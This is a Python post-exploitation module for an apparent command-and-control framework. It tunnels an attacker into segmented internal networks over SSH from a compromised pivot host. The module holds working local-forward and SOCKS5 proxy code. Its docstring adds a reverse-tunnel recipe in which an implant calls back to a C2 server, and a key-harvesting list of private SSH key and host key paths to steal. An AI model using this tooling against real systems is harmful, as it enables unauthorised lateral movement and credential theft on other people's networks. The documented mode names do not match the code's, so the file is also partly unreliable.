"""STUB — SSH pivoting and tunnelling.

Uses an SSH session on a pivot host to reach otherwise-inaccessible internal
networks.  Three primary modes: local port forward, dynamic SOCKS proxy,
and reverse tunnel (implant calls back through an SSH target to the C2).

──────────────────────────────────────────────────────────────────────────────
IMPLEMENTATION GUIDE
──────────────────────────────────────────────────────────────────────────────

pip install paramiko

CONCEPT: NETWORK SEGMENTATION BYPASS
--------------------------------------
   [Operator/C2]          [Pivot host]          [Internal target]
   10.0.0.1               192.168.1.5            10.10.10.50:443
       |                       |                      |
       |-- SSH session ------> |                      |
       |<-- local port fwd --- | <--- TCP ----------> |
   localhost:4443  <----------- forwards to --------> 10.10.10.50:443

The pivot host has two network interfaces: one reachable from the C2, one on
the internal network.


MODE 1: LOCAL PORT FORWARD (access internal service via pivot)
--------------------------------------------------------------
Equivalent to: ssh -L local_port:internal_host:internal_port user@pivot

  import socket, threading
  import paramiko

  def local_forward(pivot_host, pivot_port, pivot_user, pivot_key_path,
                    bind_port, dest_host, dest_port):

      transport = paramiko.Transport((pivot_host, pivot_port))
      transport.connect(username=pivot_user,
                        pkey=paramiko.RSAKey.from_private_key_file(pivot_key_path))

      def handle(local_sock):
          chan = transport.open_channel(
              "direct-tcpip",
              dest_addr=(dest_host, dest_port),
              src_addr=("127.0.0.1", bind_port),
          )
          # Bidirectional relay between local_sock and chan
          def relay(src, dst):
              while True:
                  data = src.recv(4096)
                  if not data:
                      break
                  dst.sendall(data)
          t1 = threading.Thread(target=relay, args=(local_sock, chan), daemon=True)
          t2 = threading.Thread(target=relay, args=(chan, local_sock), daemon=True)
          t1.start(); t2.start()
          t1.join(); t2.join()

      server = socket.socket()
      server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
      server.bind(("127.0.0.1", bind_port))
      server.listen(10)
      while True:
          client_sock, _ = server.accept()
          threading.Thread(target=handle, args=(client_sock,), daemon=True).start()

  # Now traffic to localhost:bind_port is forwarded through pivot to dest_host:dest_port


MODE 2: DYNAMIC SOCKS5 PROXY
------------------------------
Equivalent to: ssh -D 1080 user@pivot
All traffic routed through the SOCKS5 proxy at localhost:1080 is forwarded
via the pivot — gives access to the entire internal network.

  # Implement a SOCKS5 server locally; for each new connection open a
  # direct-tcpip channel on the transport to the destination.

  # SOCKS5 handshake (RFC 1928):
  #   Client:  0x05 0x01 0x00          (VER=5, NMETHODS=1, METHOD=NO_AUTH)
  #   Server:  0x05 0x00               (VER=5, METHOD=NO_AUTH accepted)
  #   Client:  0x05 0x01 0x00 0x03 <len> <host> <port_hi> <port_lo>
  #   Server:  0x05 0x00 0x00 0x01 <4-byte IP> <2-byte port>  (success)

  # Open the channel after parsing the destination from the SOCKS request:
  chan = transport.open_channel(
      "direct-tcpip",
      dest_addr=(dest_host, dest_port),
      src_addr=("127.0.0.1", 1080),
  )

  # Or use a library that implements the SOCKS5 server for you:
  pip install sshtunnel
  from sshtunnel import SSHTunnelForwarder
  # sshtunnel handles local port forwards; for full SOCKS you'd use pysocks + paramiko


MODE 3: REVERSE TUNNEL (implant on pivot phones back to C2)
------------------------------------------------------------
Equivalent to: ssh -R c2_listen_port:localhost:22 c2_user@c2_host
The pivot initiates an outbound SSH connection to the C2 and asks the C2 to
forward inbound connections on c2_listen_port back to the pivot's localhost:22.

  transport = paramiko.Transport((c2_host, c2_ssh_port))
  transport.connect(username=c2_user, password=c2_password)

  # Request remote port forwarding:
  transport.request_port_forward("", c2_listen_port)

  def accept_handler(channel):
      # channel is a new connection coming from the C2's c2_listen_port
      # relay it to localhost:22 on the pivot
      local = socket.create_connection(("127.0.0.1", 22))
      # ... relay bidirectionally as in MODE 1

  transport.set_keepalive(30)
  while True:
      chan = transport.accept(timeout=60)   # blocks until inbound connection
      if chan:
          threading.Thread(target=accept_handler, args=(chan,), daemon=True).start()


MODE 4: JUMP HOST / NESTED PIVOTING
-------------------------------------
Equivalent to: ssh -J user@hop1,user@hop2 user@final_target

  # Paramiko: use the first hop as the sock parameter for the second transport
  sock_to_hop1 = paramiko.Transport(("hop1", 22))
  sock_to_hop1.connect(username="user1", pkey=key1)
  chan_to_hop2 = sock_to_hop1.open_channel(
      "direct-tcpip", dest_addr=("hop2", 22), src_addr=("hop1", 0)
  )
  transport2 = paramiko.Transport(chan_to_hop2)   # wrap the channel as a socket
  transport2.connect(username="user2", pkey=key2)
  # Now open channels on transport2 to reach hop2's network


KEY HARVESTING (find SSH keys on the pivot to reuse)
-----------------------------------------------------
  # Paths to check for private keys:
  key_paths = [
      "~/.ssh/id_rsa", "~/.ssh/id_ecdsa", "~/.ssh/id_ed25519",
      "~/.ssh/id_dsa",
      "/root/.ssh/id_rsa",
      "/etc/ssh/ssh_host_rsa_key",       # host key — reveals server identity
  ]
  # Check known_hosts for targets this host has connected to:
  #   ~/.ssh/known_hosts — format: <hostname> <keytype> <base64-key>
  #   Use this to map out trust relationships / reachable hosts.

  # Load a key with passphrase:
  pkey = paramiko.RSAKey.from_private_key_file("id_rsa", password="passphrase")
  # or for encrypted keys without passphrase: try None, catch paramiko.PasswordRequiredException


ARGS EXPECTED BY THIS MODULE
-----------------------------
  {
    "mode":          "local_fwd" | "socks" | "reverse",
    "pivot_host":    "192.168.1.5",
    "pivot_port":    22,
    "pivot_user":    "ubuntu",
    "pivot_key":     "/path/to/id_rsa",     # or "pivot_password"
    "pivot_password": "",
    # For local_fwd and socks:
    "bind_port":     1080,
    "dest_host":     "10.10.10.50",          # local_fwd only
    "dest_port":     443,                    # local_fwd only
    # For reverse:
    "c2_host":       "10.0.0.1",
    "c2_port":       22,
    "c2_user":       "c2user",
    "c2_listen_port": 2222,
  }
"""

from post.base import ModuleResult, PostModule
from post.loader import register



# ── Imports ────────────────────────────────────────────────────────────────────

import select
import socket
import struct
import threading
from pathlib import Path

try:
    import paramiko  # type: ignore[import]
    _PARAMIKO_OK = True
except ImportError:
    _PARAMIKO_OK = False

from post.base import ModuleResult, PostModule
from post.loader import register


# ── Active pivot registry ──────────────────────────────────────────────────────

_PIVOTS: dict[str, dict] = {}   # pivot_id -> {"server": ..., "thread": ..., "info": ...}


# ── SSH connection helper ──────────────────────────────────────────────────────

def _ssh_connect(host: str, port: int, username: str, password: str = "",
                 key_path: str = "") -> "paramiko.Transport":
    transport = paramiko.Transport((host, port))
    transport.start_client()
    if key_path:
        pkey = paramiko.RSAKey.from_private_key_file(
            key_path, password=password if password else None
        )
        transport.auth_publickey(username, pkey)
    else:
        transport.auth_password(username, password)
    return transport


# ── Data forwarding ────────────────────────────────────────────────────────────

def _forward_data(chan, client_sock: socket.socket) -> None:
    """Bidirectional copy between a paramiko channel and a local socket."""
    try:
        while True:
            r, _, _ = select.select([chan, client_sock], [], [], 5)
            if chan in r:
                data = chan.recv(4096)
                if not data:
                    break
                client_sock.sendall(data)
            if client_sock in r:
                data = client_sock.recv(4096)
                if not data:
                    break
                chan.sendall(data)
    except Exception:
        pass
    finally:
        chan.close()
        client_sock.close()


# ── Local port forward ─────────────────────────────────────────────────────────

def _local_forward_handler(client_sock: socket.socket, transport: "paramiko.Transport",
                            remote_host: str, remote_port: int) -> None:
    try:
        chan = transport.open_channel(
            "direct-tcpip",
            (remote_host, remote_port),
            client_sock.getpeername(),
        )
        _forward_data(chan, client_sock)
    except Exception:
        client_sock.close()


def _start_local_forward(transport: "paramiko.Transport",
                          local_port: int, remote_host: str, remote_port: int) -> socket.socket:
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("127.0.0.1", local_port))
    server.listen(5)

    def _accept_loop():
        while True:
            try:
                client, _ = server.accept()
            except OSError:
                break
            t = threading.Thread(
                target=_local_forward_handler,
                args=(client, transport, remote_host, remote_port),
                daemon=True,
            )
            t.start()

    threading.Thread(target=_accept_loop, daemon=True).start()
    return server


# ── SOCKS5 proxy ───────────────────────────────────────────────────────────────

def _socks5_handler(client_sock: socket.socket, transport: "paramiko.Transport") -> None:
    """Handle one SOCKS5 client connection, tunnelling through SSH."""
    try:
        # ── Handshake ─────────────────────────────────────────────────────────
        # Version + methods
        data = client_sock.recv(2)
        if len(data) < 2 or data[0] != 5:
            return
        nmethods = data[1]
        client_sock.recv(nmethods)                  # read but ignore methods
        client_sock.sendall(b"\x05\x00")            # version=5, no-auth

        # ── Request ───────────────────────────────────────────────────────────
        hdr = client_sock.recv(4)
        if len(hdr) < 4 or hdr[0] != 5 or hdr[1] != 1:
            client_sock.sendall(b"\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00")
            return

        atype = hdr[3]
        if atype == 1:          # IPv4
            addr_bytes = client_sock.recv(4)
            target_host = socket.inet_ntoa(addr_bytes)
        elif atype == 3:        # Domain name
            dlen = client_sock.recv(1)[0]
            target_host = client_sock.recv(dlen).decode("utf-8", errors="replace")
        elif atype == 4:        # IPv6
            addr_bytes = client_sock.recv(16)
            target_host = socket.inet_ntop(socket.AF_INET6, addr_bytes)
        else:
            client_sock.sendall(b"\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00")
            return

        port_bytes = client_sock.recv(2)
        target_port = struct.unpack(">H", port_bytes)[0]

        # ── Open SSH channel to target ────────────────────────────────────────
        try:
            chan = transport.open_channel(
                "direct-tcpip",
                (target_host, target_port),
                ("127.0.0.1", 0),
            )
        except Exception:
            client_sock.sendall(b"\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00")
            return

        # ── Success response ──────────────────────────────────────────────────
        client_sock.sendall(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
        _forward_data(chan, client_sock)

    except Exception:
        pass
    finally:
        try:
            client_sock.close()
        except Exception:
            pass


def _start_socks5(transport: "paramiko.Transport", local_port: int) -> socket.socket:
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("127.0.0.1", local_port))
    server.listen(10)

    def _accept_loop():
        while True:
            try:
                client, _ = server.accept()
            except OSError:
                break
            t = threading.Thread(
                target=_socks5_handler, args=(client, transport), daemon=True
            )
            t.start()

    threading.Thread(target=_accept_loop, daemon=True).start()
    return server


# ── Module ─────────────────────────────────────────────────────────────────────

@register
class SSHPivotModule(PostModule):
    NAME        = "lateral/ssh"
    DESCRIPTION = "SSH tunnelling via paramiko: SOCKS5 proxy or local port forward through a pivot host"
    PLATFORM    = ["linux", "darwin", "windows"]
    IMPLEMENTED = True

    def run(self, args: dict | None = None) -> ModuleResult:
        """
        Args:
            mode        (str): "socks5" | "forward" | "list" | "stop"

            For socks5 / forward:
              ssh_host  (str): Pivot SSH server hostname/IP
              ssh_port  (int): SSH port (default 22)
              ssh_user  (str): SSH username
              ssh_pass  (str): SSH password (use key_path instead where possible)
              key_path  (str): Path to SSH private key file
              local_port(int): Local TCP port to listen on (default 1080 for socks5)
            For forward additionally:
              remote_host (str): Host to reach through the pivot
              remote_port (int): Port on remote_host

            For stop:
              pivot_id  (str): ID returned when the pivot was started
        """
        if not _PARAMIKO_OK:
            return ModuleResult(ok=False, output="",
                                error="paramiko not installed: pip install paramiko")

        args = args or {}
        mode = args.get("mode", "list").lower()

        # ── list ──────────────────────────────────────────────────────────────
        if mode == "list":
            if not _PIVOTS:
                return ModuleResult(ok=True, output="No active pivots.", data={"pivots": []})
            lines = ["Active pivots:"]
            for pid, pinfo in _PIVOTS.items():
                lines.append(f"  [{pid}] {pinfo['info']}")
            return ModuleResult(ok=True, output="\n".join(lines),
                                data={"pivots": list(_PIVOTS.keys())})

        # ── stop ──────────────────────────────────────────────────────────────
        if mode == "stop":
            pivot_id = args.get("pivot_id", "")
            if not pivot_id or pivot_id not in _PIVOTS:
                return ModuleResult(ok=False, output="",
                                    error=f"Unknown pivot_id: {pivot_id}")
            pinfo = _PIVOTS.pop(pivot_id)
            try:
                pinfo["server"].close()
            except Exception:
                pass
            try:
                pinfo["transport"].close()
            except Exception:
                pass
            return ModuleResult(ok=True, output=f"Pivot {pivot_id} stopped.", data={})

        # ── common SSH connection args ─────────────────────────────────────────
        ssh_host  = args.get("ssh_host", "")
        ssh_port  = int(args.get("ssh_port", 22))
        ssh_user  = args.get("ssh_user", "")
        ssh_pass  = args.get("ssh_pass", "")
        key_path  = args.get("key_path", "")
        local_port = int(args.get("local_port", 1080 if mode == "socks5" else 0))

        if not ssh_host or not ssh_user:
            return ModuleResult(ok=False, output="",
                                error="Required: ssh_host, ssh_user")
        if not ssh_pass and not key_path:
            return ModuleResult(ok=False, output="",
                                error="Required: ssh_pass or key_path")

        try:
            transport = _ssh_connect(ssh_host, ssh_port, ssh_user, ssh_pass, key_path)
        except Exception as e:
            return ModuleResult(ok=False, output="", error=f"SSH connection failed: {e}")

        import os as _os
        pivot_id = _os.urandom(4).hex()

        # ── socks5 ────────────────────────────────────────────────────────────
        if mode == "socks5":
            try:
                server = _start_socks5(transport, local_port)
            except Exception as e:
                transport.close()
                return ModuleResult(ok=False, output="", error=f"Failed to bind: {e}")

            info = f"SOCKS5 127.0.0.1:{local_port} → {ssh_user}@{ssh_host}:{ssh_port}"
            _PIVOTS[pivot_id] = {"server": server, "transport": transport, "info": info}
            lines = [
                f"SOCKS5 proxy started — ID: {pivot_id}",
                f"  Local:  127.0.0.1:{local_port}",
                f"  Via:    {ssh_user}@{ssh_host}:{ssh_port}",
                "",
                "Configure proxychains:  socks5 127.0.0.1 " + str(local_port),
                "Configure curl:         curl --socks5 127.0.0.1:" + str(local_port) + " http://target/",
                "",
                f"Stop with: run(args={{'mode': 'stop', 'pivot_id': '{pivot_id}'}})",
            ]
            return ModuleResult(ok=True, output="\n".join(lines),
                                data={"pivot_id": pivot_id, "local_port": local_port,
                                      "ssh_host": ssh_host})

        # ── forward ───────────────────────────────────────────────────────────
        if mode == "forward":
            remote_host = args.get("remote_host", "")
            remote_port = int(args.get("remote_port", 0))
            if not remote_host or not remote_port:
                transport.close()
                return ModuleResult(ok=False, output="",
                                    error="forward mode requires remote_host and remote_port")
            try:
                server = _start_local_forward(transport, local_port, remote_host, remote_port)
            except Exception as e:
                transport.close()
                return ModuleResult(ok=False, output="", error=f"Failed to bind: {e}")

            info = (f"LocalFwd 127.0.0.1:{local_port} → {remote_host}:{remote_port} "
                    f"via {ssh_user}@{ssh_host}")
            _PIVOTS[pivot_id] = {"server": server, "transport": transport, "info": info}
            lines = [
                f"Local port forward started — ID: {pivot_id}",
                f"  Local:   127.0.0.1:{local_port}",
                f"  Remote:  {remote_host}:{remote_port}",
                f"  Via:     {ssh_user}@{ssh_host}:{ssh_port}",
                "",
                f"Stop with: run(args={{'mode': 'stop', 'pivot_id': '{pivot_id}'}})",
            ]
            return ModuleResult(ok=True, output="\n".join(lines),
                                data={"pivot_id": pivot_id, "local_port": local_port,
                                      "remote_host": remote_host, "remote_port": remote_port})

        transport.close()
        return ModuleResult(ok=False, output="",
                            error=f"Unknown mode '{mode}'. Use: socks5 | forward | list | stop")
